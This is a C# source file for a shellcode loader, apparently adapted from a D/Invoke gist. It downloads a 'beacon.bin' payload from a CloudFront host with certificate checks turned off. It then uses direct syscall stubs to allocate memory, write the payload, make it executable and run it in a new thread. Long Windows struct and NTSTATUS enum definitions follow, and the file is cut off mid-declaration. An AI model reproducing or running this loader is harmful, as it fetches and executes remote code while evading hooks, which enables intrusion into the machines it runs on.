using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using System.Security.Cryptography;
using static classicwodinvoke.DELEGATES;


//reference https://gist.githubusercontent.com/jfmaes/944991c40fb34625cf72fd33df1682c0/raw/68bbba6534499c4683ce868272398b3b9571be97/DInjectQueuerAPC.cs

namespace classicwodinvoke
{
    internal class Program
    {



        static async Task Main(string[] args)
        {



            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // Ignore SSL
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    // Download the shellcode
                    shellcode = await client.GetByteArrayAsync("https://d8l4xxrfk9hyp.cloudfront.net/beacon.bin");
                }
            }



            STRUCTS.STARTUPINFO si = new STRUCTS.STARTUPINFO();
            STRUCTS.PROCESS_INFORMATION pi = new STRUCTS.PROCESS_INFORMATION();


            //start here 


            IntPtr hProcess = (IntPtr)(-1);


            var stub = TinySharpSploit.GetSyscallStub("NtAllocateVirtualMemory");
          var ntallocatevirtualmemory = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtAllocateVirtualMemory)) as DELEGATES.NtAllocateVirtualMemory;


          IntPtr hbaseAddress = IntPtr.Zero;
          IntPtr regionSize = (IntPtr)shellcode.Length;
          long ntstatus = ntallocatevirtualmemory((IntPtr)(-1), ref hbaseAddress, IntPtr.Zero, ref regionSize, (UInt32)0x00001000 | (UInt32)0x00002000, (UInt32)0x40);
          Console.WriteLine($"Allocated {shellcode.Length} bytes at address {hbaseAddress.ToInt64().ToString("x2")} in remote process. Success: {ntstatus == 0}");
          System.Console.ReadKey();




         UInt32 bufferLength = (UInt32)shellcode.Length;
         stub = TinySharpSploit.GetSyscallStub("NtWriteVirtualMemory");

         var ntwritevirtualmemory = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;

         ntstatus = ntwritevirtualmemory(hProcess, hbaseAddress, Marshal.UnsafeAddrOfPinnedArrayElement(shellcode, 0), bufferLength, ref bufferLength);
         Console.WriteLine($"wrote shellcode  at {hbaseAddress.ToInt64().ToString("x2")} in the current process");
         System.Console.ReadKey();




         stub = TinySharpSploit.GetSyscallStub("NtProtectVirtualMemory");
         var ntprotectvirtualmemory = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;

         UInt32 oldProtect = (UInt32)0;
         IntPtr regionSizePtr = (IntPtr)shellcode.Length;
         ntstatus = ntprotectvirtualmemory(hProcess, ref hbaseAddress, ref regionSizePtr, (UInt32)0x20, ref oldProtect);
         Console.WriteLine($"Protection changed at  {hbaseAddress.ToInt64().ToString("x2")} in remote process. Success: {ntstatus == 0}");
         System.Console.ReadKey();
           




         stub = TinySharpSploit.GetSyscallStub("NtCreateThreadEx");
         var ntcreatethreadex = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtCreateThreadEx)) as DELEGATES.NtCreateThreadEx;

         IntPtr threadHeandle = IntPtr.Zero;

         STRUCTS.NTSTATUS ntstatus1 = ntcreatethreadex(out  threadHeandle, STRUCTS.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, hbaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
         Console.WriteLine($"Started thread handle {threadHeandle} . Success: {ntstatus1 == 0}.");
         System.Console.ReadKey();





         stub = TinySharpSploit.GetSyscallStub("NtWaitForSingleObject");
         var ntwaitforsingleobject = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtWaitForSingleObject)) as DELEGATES.NtWaitForSingleObject;

         var ntstatus2 =  ntwaitforsingleobject(threadHeandle, true, 0xFFFFFFFF);
         Console.WriteLine($"ntwaitforsingleobject has been called {threadHeandle} . Success: {ntstatus2 == true}.");
         System.Console.ReadKey();



         stub = TinySharpSploit.GetSyscallStub("NtFreeVirtualMemory");
         var ntfreevirtualmemory = Marshal.GetDelegateForFunctionPointer(stub, typeof(DELEGATES.NtFreeVirtualMemory)) as DELEGATES.NtFreeVirtualMemory;




         STRUCTS.NTSTATUS ntstatus3 = ntfreevirtualmemory(hProcess, ref hbaseAddress, ref regionSizePtr, STRUCTS.MEM_RELEASE);
         Console.WriteLine($"ntfreevirtualmemory has been called. Result: {ntstatus3}.");
         System.Console.ReadKey();




        }


    }





        public struct DELEGATES
        {


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtOpenProcess(ref IntPtr ProcessHandle, STRUCTS.ProcessAccessFlags DesiredAccess, ref STRUCTS.OBJECT_ATTRIBUTES ObjectAttributes, ref STRUCTS.CLIENT_ID ClientId);


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate Boolean NtWaitForSingleObject(IntPtr hHandle, bool Alertable, uint dwMilliseconds);



            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);



            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);



            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate STRUCTS.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);



            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlZeroMemory(IntPtr Destination, int length);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtQueryInformationProcess(IntPtr processHandle, STRUCTS.PROCESSINFOCLASS processInformationClass, IntPtr processInformation, int processInformationLength, ref uint returnLength);


            //loader stuff

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
        }

        public class STRUCTS
        {

            [Flags]
            public enum ProcessCreationFlags : uint
            {
                ZERO_FLAG = 0x00000000,
                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                CREATE_NEW_CONSOLE = 0x00000010,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_NO_WINDOW = 0x08000000,
                CREATE_PROTECTED_PROCESS = 0x00040000,
                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                CREATE_SEPARATE_WOW_VDM = 0x00001000,
                CREATE_SHARED_WOW_VDM = 0x00001000,
                CREATE_SUSPENDED = 0x00000004,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                DEBUG_PROCESS = 0x00000001,
                DETACHED_PROCESS = 0x00000008,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                INHERIT_PARENT_AFFINITY = 0x00010000
            }

            [Flags]
            public enum ThreadAccess : int
            {
                TERMINATE = (0x0001),
                SUSPEND_RESUME = (0x0002),
                GET_CONTEXT = (0x0008),
                SET_CONTEXT = (0x0010),
                SET_INFORMATION = (0x0020),
                QUERY_INFORMATION = (0x0040),
                SET_THREAD_TOKEN = (0x0080),
                IMPERSONATE = (0x0100),
                DIRECT_IMPERSONATION = (0x0200),
                THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
                THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
            }
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public uint dwProcessId;
                public uint dwThreadId;
            }

            public struct OBJECT_ATTRIBUTES
            {
                public int Length;

                public IntPtr RootDirectory;

                public IntPtr ObjectName;

                public uint Attributes;

                public IntPtr SecurityDescriptor;

                public IntPtr SecurityQualityOfService;
            }
            public struct STARTUPINFO
            {
                public uint cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public uint dwX;
                public uint dwY;
                public uint dwXSize;
                public uint dwYSize;
                public uint dwXCountChars;
                public uint dwYCountChars;
                public uint dwFillAttribute;
                public uint dwFlags;
                public short wShowWindow;
                public short cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            public struct PE_META_DATA
            {
                public uint Pe;

                public bool Is32Bit;

                public IMAGE_FILE_HEADER ImageFileHeader;

                public IMAGE_OPTIONAL_HEADER32 OptHeader32;

                public IMAGE_OPTIONAL_HEADER64 OptHeader64;

                public IMAGE_SECTION_HEADER[] Sections;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct UNICODE_STRING
            {
                public UInt16 Length;
                public UInt16 MaximumLength;
                public IntPtr Buffer;
            }


            public enum PROCESSINFOCLASS
            {
                ProcessBasicInformation,
                ProcessQuotaLimits,
                ProcessIoCounters,
                ProcessVmCounters,
                ProcessTimes,
                ProcessBasePriority,
                ProcessRaisePriority,
                ProcessDebugPort,
                ProcessExceptionPort,
                ProcessAccessToken,
                ProcessLdtInformation,
                ProcessLdtSize,
                ProcessDefaultHardErrorMode,
                ProcessIoPortHandlers,
                ProcessPooledUsageAndLimits,
                ProcessWorkingSetWatch,
                ProcessUserModeIOPL,
                ProcessEnableAlignmentFaultFixup,
                ProcessPriorityClass,
                ProcessWx86Information,
                ProcessHandleCount,
                ProcessAffinityMask,
                ProcessPriorityBoost,
                ProcessDeviceMap,
                ProcessSessionInformation,
                ProcessForegroundInformation,
                ProcessWow64Information,
                ProcessImageFileName,
                ProcessLUIDDeviceMapsEnabled,
                ProcessBreakOnTermination,
                ProcessDebugObjectHandle,
                ProcessDebugFlags,
                ProcessHandleTracing,
                ProcessIoPriority,
                ProcessExecuteFlags,
                ProcessResourceManagement,
                ProcessCookie,
                ProcessImageInformation,
                ProcessCycleTime,
                ProcessPagePriority,
                ProcessInstrumentationCallback,
                ProcessThreadStackAllocation,
                ProcessWorkingSetWatchEx,
                ProcessImageFileNameWin32,
                ProcessImageFileMapping,
                ProcessAffinityUpdateMode,
                ProcessMemoryAllocationMode,
                ProcessGroupInformation,
                ProcessTokenVirtualizationEnabled,
                ProcessConsoleHostProcess,
                ProcessWindowInformation,
                ProcessHandleInformation,
                ProcessMitigationPolicy,
                ProcessDynamicFunctionTableInformation,
                ProcessHandleCheckingMode,
                ProcessKeepAliveCount,
                ProcessRevokeFileHandles,
                MaxProcessInfoClass
            }









            /// <summary>
            /// NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
            /// https://www.pinvoke.net/default.aspx/Enums/NtStatus.html
            /// </summary>
            public enum NTSTATUS : uint
            {
                // Success
                Success = 0x00000000,
                Wait0 = 0x00000000,
                Wait1 = 0x00000001,
                Wait2 = 0x00000002,
                Wait3 = 0x00000003,
                Wait63 = 0x0000003f,
                Abandoned = 0x00000080,
                AbandonedWait0 = 0x00000080,
                AbandonedWait1 = 0x00000081,
                AbandonedWait2 = 0x00000082,
                AbandonedWait3 = 0x00000083,
                AbandonedWait63 = 0x000000bf,
                UserApc = 0x000000c0,
                KernelApc = 0x00000100,
                Alerted = 0x00000101,
                Timeout = 0x00000102,
                Pending = 0x00000103,
                Reparse = 0x00000104,
                MoreEntries = 0x00000105,
                NotAllAssigned = 0x00000106,
                SomeNotMapped = 0x00000107,
                OpLockBreakInProgress = 0x00000108,
                VolumeMounted = 0x00000109,
                RxActCommitted = 0x0000010a,
                NotifyCleanup = 0x0000010b,
                NotifyEnumDir = 0x0000010c,
                NoQuotasForAccount = 0x0000010d,
                PrimaryTransportConnectFailed = 0x0000010e,
                PageFaultTransition = 0x00000110,
                PageFaultDemandZero = 0x00000111,
                PageFaultCopyOnWrite = 0x00000112,
                PageFaultGuardPage = 0x00000113,
                PageFaultPagingFile = 0x00000114,
                CrashDump = 0x00000116,
                ReparseObject = 0x00000118,
                NothingToTerminate = 0x00000122,
                ProcessNotInJob = 0x00000123,
                ProcessInJob = 0x00000124,
                ProcessCloned = 0x00000129,
                FileLockedWithOnlyReaders = 0x0000012a,
                FileLockedWithWriters = 0x0000012b,

                // Informational
                Informational = 0x40000000,
                ObjectNameExists = 0x40000000,
                ThreadWasSuspended = 0x40000001,
                WorkingSetLimitRange = 0x40000002,
                ImageNotAtBase = 0x40000003,
                RegistryRecovered = 0x40000009,

                // Warning
                Warning = 0x80000000,
                GuardPageViolation = 0x80000001,
                DatatypeMisalignment = 0x80000002,
                Breakpoint = 0x80000003,
                SingleStep = 0x80000004,
                BufferOverflow = 0x80000005,
                NoMoreFiles = 0x80000006,
                HandlesClosed = 0x8000000a,
                PartialCopy = 0x8000000d,
                DeviceBusy = 0x80000011,
                InvalidEaName = 0x80000013,
                EaListInconsistent = 0x80000014,
                NoMoreEntries = 0x8000001a,
                LongJump = 0x80000026,
                DllMightBeInsecure = 0x8000002b,

                // Error
                Error = 0xc0000000,
                Unsuccessful = 0xc0000001,
                NotImplemented = 0xc0000002,
                InvalidInfoClass = 0xc0000003,
                InfoLengthMismatch = 0xc0000004,
                AccessViolation = 0xc0000005,
                InPageError = 0xc0000006,
                PagefileQuota = 0xc0000007,
                InvalidHandle = 0xc0000008,
                BadInitialStack = 0xc0000009,
                BadInitialPc = 0xc000000a,
                InvalidCid = 0xc000000b,
                TimerNotCanceled = 0xc000000c,
                InvalidParameter = 0xc000000d,
                NoSuchDevice = 0xc000000e,
                NoSuchFile = 0xc000000f,
                InvalidDeviceRequest = 0xc0000010,
                EndOfFile = 0xc0000011,
                WrongVolume = 0xc0000012,
                NoMediaInDevice = 0xc0000013,
                NoMemory = 0xc0000017,
                ConflictingAddresses = 0xc0000018,
                NotMappedView = 0xc0000019,
                UnableToFreeVm = 0xc000001a,
                UnableToDeleteSection = 0xc000001b,
                IllegalInstruction = 0xc000001d,
                AlreadyCommitted = 0xc0000021,
                AccessDenied = 0xc0000022,
                BufferTooSmall = 0xc0000023,
                ObjectTypeMismatch = 0xc0000024,
                NonContinuableException = 0xc0000025,
                BadStack = 0xc0000028,
                NotLocked = 0xc000002a,
                NotCommitted = 0xc000002d,
                InvalidParameterMix = 0xc0000030,
                ObjectNameInvalid = 0xc0000033,
                ObjectNameNotFound = 0xc0000034,
                ObjectNameCollision = 0xc0000035,
                ObjectPathInvalid = 0xc0000039,
                ObjectPathNotFound = 0xc000003a,
                ObjectPathSyntaxBad = 0xc000003b,
                DataOverrun = 0xc000003c,
                DataLate = 0xc000003d,
                DataError = 0xc000003e,
                CrcError = 0xc000003f,
                SectionTooBig = 0xc0000040,
                PortConnectionRefused = 0xc0000041,
                InvalidPortHandle = 0xc0000042,
                SharingViolation = 0xc0000043,
                QuotaExceeded = 0xc0000044,
                InvalidPageProtection = 0xc0000045,
                MutantNotOwned = 0xc0000046,
                SemaphoreLimitExceeded = 0xc0000047,
                PortAlreadySet = 0xc0000048,
                SectionNotImage = 0xc0000049,
                SuspendCountExceeded = 0xc000004a,
                ThreadIsTerminating = 0xc000004b,
                BadWorkingSetLimit = 0xc000004c,
                IncompatibleFileMap = 0xc000004d,
                SectionProtection = 0xc000004e,
                EasNotSupported = 0xc000004f,
                EaTooLarge = 0xc0000050,
                NonExistentEaEntry = 0xc0000051,
                NoEasOnFile = 0xc0000052,
                EaCorruptError = 0xc0000053,
                FileLockConflict = 0xc0000054,
                LockNotGranted = 0xc0000055,
                DeletePending = 0xc0000056,
                CtlFileNotSupported = 0xc0000057,
                UnknownRevision = 0xc0000058,
                RevisionMismatch = 0xc0000059,
                InvalidOwner = 0xc000005a,
                InvalidPrimaryGroup = 0xc000005b,
                NoImpersonationToken = 0xc000005c,
                CantDisableMandatory = 0xc000005d,
                NoLogonServers = 0xc000005e,
                NoSuchLogonSession = 0xc000005f,
                NoSuchPrivilege = 0xc0000060,
                PrivilegeNotHeld = 0xc0000061,
                InvalidAccountName = 0xc0000062,
                UserExists = 0xc0000063,
                NoSuchUser = 0xc0000064,
                GroupExists = 0xc0000065,
                NoSuchGroup = 0xc0000066,
                MemberInGroup = 0xc0000067,
                MemberNotInGroup = 0xc0000068,
                LastAdmin = 0xc0000069,
                WrongPassword = 0xc000006a,
                IllFormedPassword = 0xc000006b,
                PasswordRestriction = 0xc000006c,
                LogonFailure = 0xc000006d,
                AccountRestriction = 0xc000006e,
                InvalidLogonHours = 0xc000006f,
                InvalidWorkstation = 0xc0000070,
                PasswordExpired = 0xc0000071,
                AccountDisabled = 0xc0000072,
                NoneMapped = 0xc0000073,
                TooManyLuidsRequested = 0xc0000074,
                LuidsExhausted = 0xc0000075,
                InvalidSubAuthority = 0xc0000076,
                InvalidAcl = 0xc0000077,
                InvalidSid = 0xc0000078,
                InvalidSecurityDescr = 0xc0000079,
                ProcedureNotFound = 0xc000007a,
                InvalidImageFormat = 0xc000007b,
                NoToken = 0xc000007c,
                BadInheritanceAcl = 0xc000007d,
                RangeNotLocked = 0xc000007e,
                DiskFull = 0xc000007f,
                ServerDisabled = 0xc0000080,
                ServerNotDisabled = 0xc0000081,
                TooManyGuidsRequested = 0xc0000082,
                GuidsExhausted = 0xc0000083,
                InvalidIdAuthority = 0xc0000084,
                AgentsExhausted = 0xc0000085,
                InvalidVolumeLabel = 0xc0000086,
                SectionNotExtended = 0xc0000087,
                NotMappedData = 0xc0000088,
                ResourceDataNotFound = 0xc0000089,
                ResourceTypeNotFound = 0xc000008a,
                ResourceNameNotFound = 0xc000008b,
                ArrayBoundsExceeded = 0xc000008c,
                FloatDenormalOperand = 0xc000008d,
                FloatDivideByZero = 0xc000008e,
                FloatInexactResult = 0xc000008f,
                FloatInvalidOperation = 0xc0000090,
                FloatOverflow = 0xc0000091,
                FloatStackCheck = 0xc0000092,
                FloatUnderflow = 0xc0000093,
                IntegerDivideByZero = 0xc0000094,
                IntegerOverflow = 0xc0000095,
                PrivilegedInstruction = 0xc0000096,
                TooManyPagingFiles = 0xc0000097,
                FileInvalid = 0xc0000098,
                InsufficientResources = 0xc000009a,
                InstanceNotAvailable = 0xc00000ab,
                PipeNotAvailable = 0xc00000ac,
                InvalidPipeState = 0xc00000ad,
                PipeBusy = 0xc00000ae,
                IllegalFunction = 0xc00000af,
                PipeDisconnected = 0xc00000b0,
                PipeClosing = 0xc00000b1,
                PipeConnected = 0xc00000b2,
                PipeListening = 0xc00000b3,
                InvalidReadMode = 0xc00000b4,
                IoTimeout = 0xc00000b5,
                FileForcedClosed = 0xc00000b6,
                ProfilingNotStarted = 0xc00000b7,
                ProfilingNotStopped = 0xc00000b8,
                NotSameDevice = 0xc00000d4,
                FileRenamed = 0xc00000d5,
                CantWait = 0xc00000d8,
                PipeEmpty = 0xc00000d9,
                CantTerminateSelf = 0xc00000db,
                InternalError = 0xc00000e5,
                InvalidParameter1 = 0xc00000ef,
                InvalidParameter2 = 0xc00000f0,
                InvalidParameter3 = 0xc00000f1,
                InvalidParameter4 = 0xc00000f2,
                InvalidParameter5 = 0xc00000f3,
                InvalidParameter6 = 0xc00000f4,
                InvalidParameter7 = 0xc00000f5,
                InvalidParameter8 = 0xc00000f6,
                InvalidParameter9 = 0xc00000f7,
                InvalidParameter10 = 0xc00000f8,
                InvalidParameter11 = 0xc00000f9,
                InvalidParameter12 = 0xc00000fa,
                ProcessIsTerminating = 0xc000010a,
                MappedFileSizeZero = 0xc000011e,
                TooManyOpenedFiles = 0xc000011f,
                Cancelled = 0xc0000120,
                CannotDelete = 0xc0000121,
                InvalidComputerName = 0xc0000122,
                FileDeleted = 0xc0000123,
                SpecialAccount = 0xc0000124,
                SpecialGroup = 0xc0000125,
                SpecialUser = 0xc0000126,
                MembersPrimaryGroup = 0xc0000127,
                FileClosed = 0xc0000128,
                TooManyThreads = 0xc0000129,
                ThreadNotInProcess = 0xc000012a,
                TokenAlreadyInUse = 0xc000012b,
                PagefileQuotaExceeded = 0xc000012c,
                CommitmentLimit = 0xc000012d,
                InvalidImageLeFormat = 0xc000012e,
                InvalidImageNotMz = 0xc000012f,
                InvalidImageProtect = 0xc0000130,
                InvalidImageWin16 = 0xc0000131,
                LogonServer = 0xc0000132,
                DifferenceAtDc = 0xc0000133,
                SynchronizationRequired = 0xc0000134,
                DllNotFound = 0xc0000135,
                IoPrivilegeFailed = 0xc0000137,
                OrdinalNotFound = 0xc0000138,
                EntryPointNotFound = 0xc0000139,
                ControlCExit = 0xc000013a,
                InvalidAddress = 0xc0000141,
                PortNotSet = 0xc0000353,
                DebuggerInactive = 0xc0000354,
                CallbackBypass = 0xc0000503,
                PortClosed = 0xc0000700,
                MessageLost = 0xc0000701,
                InvalidMessage = 0xc0000702,
                RequestCanceled = 0xc0000703,
                RecursiveDispatch = 0xc0000704,
                LpcReceiveBufferExpected = 0xc0000705,
                LpcInvalidConnectionUsage = 0xc0000706,
                LpcRequestsNotAllowed = 0xc0000707,
                ResourceInUse = 0xc0000708,
                ProcessIsProtected = 0xc0000712,
                VolumeDirty = 0xc0000806,
                FileCheckedOut = 0xc0000901,
                CheckOutRequired = 0xc0000902,
                BadFileType = 0xc0000903,
                FileTooLarge = 0xc0000904,
                FormsAuthRequired = 0xc0000905,
                VirusInfected = 0xc0000906,
                VirusDeleted = 0xc0000907,
                TransactionalConflict = 0xc0190001,
                InvalidTransaction = 0xc0190002,
                TransactionNotActive = 0xc0190003,
                TmInitializationFailed = 0xc0190004,
                RmNotActive = 0xc0190005,
                RmMetadataCorrupt = 0xc0190006,
                TransactionNotJoined = 0xc0190007,
                DirectoryNotRm = 0xc0190008,
                CouldNotResizeLog = 0xc0190009,
                TransactionsUnsupportedRemote = 0xc019000a,
                LogResizeInvalidSize = 0xc019000b,
                RemoteFileVersionMismatch = 0xc019000c,
                CrmProtocolAlreadyExists = 0xc019000f,
                TransactionPropagationFailed = 0xc0190010,
                CrmProtocolNotFound = 0xc0190011,
                TransactionSuperiorExists = 0xc0190012,
                TransactionRequestNotValid = 0xc0190013,
                TransactionNotRequested = 0xc0190014,
                TransactionAlreadyAborted = 0xc0190015,
                TransactionAlreadyCommitted = 0xc0190016,
                TransactionInvalidMarshallBuffer = 0xc0190017,
                CurrentTransactionNotValid = 0xc0190018,
                LogGrowthFailed = 0xc0190019,
                ObjectNoLongerExists = 0xc0190021,
                StreamMiniversionNotFound = 0xc0190022,
                StreamMiniversionNotValid = 0xc0190023,
                MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
                CantOpenMiniversionWithModifyIntent = 0xc0190025,
                CantCreateMoreStreamMiniversions = 0xc0190026,
                HandleNoLongerValid = 0xc0190028,
                NoTxfMetadata = 0xc0190029,
                LogCorruptionDetected = 0xc0190030,
                CantRecoverWithHandleOpen = 0xc0190031,
                RmDisconnected = 0xc0190032,
                EnlistmentNotSuperior = 0xc0190033,
                RecoveryNotNeeded = 0xc0190034,
                RmAlreadyStarted = 0xc0190035,
                FileIdentityNotPersistent = 0xc0190036,
                CantBreakTransactionalDependency = 0xc0190037,
                CantCrossRmBoundary = 0xc0190038,
                TxfDirNotEmpty = 0xc0190039,
                IndoubtTransactionsExist = 0xc019003a,
                TmVolatile = 0xc019003b,
                RollbackTimerExpired = 0xc019003c,
                TxfAttributeCorrupt = 0xc019003d,
                EfsNotAllowedInTransaction = 0xc019003e,
                TransactionalOpenNotAllowed = 0xc019003f,
                TransactedMappingUnsupportedRemote = 0xc0190040,
                TxfMetadataAlreadyPresent = 0xc0190041,
                TransactionScopeCallbacksNotSet = 0xc0190042,
                TransactionRequiredPromotion = 0xc0190043,
                CannotExecuteFileInTransaction = 0xc0190044,
                TransactionsNotFrozen = 0xc0190045,

                MaximumNtStatus = 0xffffffff
            }

            public struct PROCESS_BASIC_INFORMATION
            {
                public IntPtr ExitStatus;

                public IntPtr PebBaseAddress;

                public IntPtr AffinityMask;

                public IntPtr BasePriority;

                public UIntPtr UniqueProcessId;

                public int InheritedFromUniqueProcessId;

                public int Size => Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION));
            }


            public struct IMAGE_DATA_DIRECTORY
            {
                public uint VirtualAddress;

                public uint Size;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER32
            {
                public ushort Magic;

                public byte MajorLinkerVersion;

                public byte MinorLinkerVersion;

                public uint SizeOfCode;

                public uint SizeOfInitializedData;

                public uint SizeOfUninitializedData;

                public uint AddressOfEntryPoint;

                public uint BaseOfCode;

                public uint BaseOfData;

                public uint ImageBase;

                public uint SectionAlignment;

                public uint FileAlignment;

                public ushort MajorOperatingSystemVersion;

                public ushort MinorOperatingSystemVersion;

                public ushort MajorImageVersion;

                public ushort MinorImageVersion;

                public ushort MajorSubsystemVersion;

                public ushort MinorSubsystemVersion;

                public uint Win32VersionValue;

                public uint SizeOfImage;

                public uint SizeOfHeaders;

                public uint CheckSum;

                public ushort Subsystem;

                public ushort DllCharacteristics;

                public uint SizeOfStackReserve;

                public uint SizeOfStackCommit;

                public uint SizeOfHeapReserve;

                public uint SizeOfHeapCommit;

                public uint LoaderFlags;

                public uint NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;

                public IMAGE_DATA_DIRECTORY ImportTable;

                public IMAGE_DATA_DIRECTORY ResourceTable;

                public IMAGE_DATA_DIRECTORY ExceptionTable;

                public IMAGE_DATA_DIRECTORY CertificateTable;

                public IMAGE_DATA_DIRECTORY BaseRelocationTable;

                public IMAGE_DATA_DIRECTORY Debug;

                public IMAGE_DATA_DIRECTORY Architecture;

                public IMAGE_DATA_DIRECTORY GlobalPtr;

                public IMAGE_DATA_DIRECTORY TLSTable;

                public IMAGE_DATA_DIRECTORY LoadConfigTable;

                public IMAGE_DATA_DIRECTORY BoundImport;

                public IMAGE_DATA_DIRECTORY IAT;

                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

                public IMAGE_DATA_DIRECTORY Reserved;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct IMAGE_OPTIONAL_HEADER64
            {
                public ushort Magic;

                public byte MajorLinkerVersion;

                public byte MinorLinkerVersion;

                public uint SizeOfCode;

                public uint SizeOfInitializedData;

                public uint SizeOfUninitializedData;

                public uint AddressOfEntryPoint;

                public uint BaseOfCode;

                public ulong ImageBase;

                public uint SectionAlignment;

                public uint FileAlignment;

                public ushort MajorOperatingSystemVersion;

                public ushort MinorOperatingSystemVersion;

                public ushort MajorImageVersion;

                public ushort MinorImageVersion;

                public ushort MajorSubsystemVersion;

                public ushort MinorSubsystemVersion;

                public uint Win32VersionValue;

                public uint SizeOfImage;

                public uint SizeOfHeaders;

                public uint CheckSum;

                public ushort Subsystem;

                public ushort DllCharacteristics;

                public ulong SizeOfStackReserve;

                public ulong SizeOfStackCommit;

                public ulong SizeOfHeapReserve;

                public ulong SizeOfHeapCommit;

                public uint LoaderFlags;

                public uint NumberOfRvaAndSizes;

                public IMAGE_DATA_DIRECTORY ExportTable;

                public IMAGE_DATA_DIRECTORY ImportTable;

                public IMAGE_DATA_DIRECTORY ResourceTable;

                public IMAGE_DATA_DIRECTORY ExceptionTable;

                public IMAGE_DATA_DIRECTORY CertificateTable;

                public IMAGE_DATA_DIRECTORY BaseRelocationTable;

                public IMAGE_DATA_DIRECTORY Debug;

                public IMAGE_DATA_DIRECTORY Architecture;

                public IMAGE_DATA_DIRECTORY GlobalPtr;

                public IMAGE_DATA_DIRECTORY TLSTable;

                public IMAGE_DATA_DIRECTORY LoadConfigTable;

                public IMAGE_DATA_DIRECTORY BoundImport;

                public IMAGE_DATA_DIRECTORY IAT;

                public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

                public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

                public IMAGE_DATA_DIRECTORY Reserved;
            }

            public static uint MEM_COMMIT = 4096u;

            public static uint MEM_RESERVE = 8192u;

            public static uint MEM_RESET = 524288u;

            public static uint MEM_RESET_UNDO = 16777216u;

            public static uint MEM_LARGE_PAGES = 536870912u;

            public static uint MEM_PHYSICAL = 4194304u;

            public static uint MEM_TOP_DOWN = 1048576u;

            public static uint MEM_WRITE_WATCH = 2097152u;

            public static uint MEM_COALESCE_PLACEHOLDERS = 1u;

            public static uint MEM_PRESERVE_PLACEHOLDER = 2u;

            public static uint MEM_DECOMMIT = 16384u;

            public static uint MEM_RELEASE = 32768u;

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
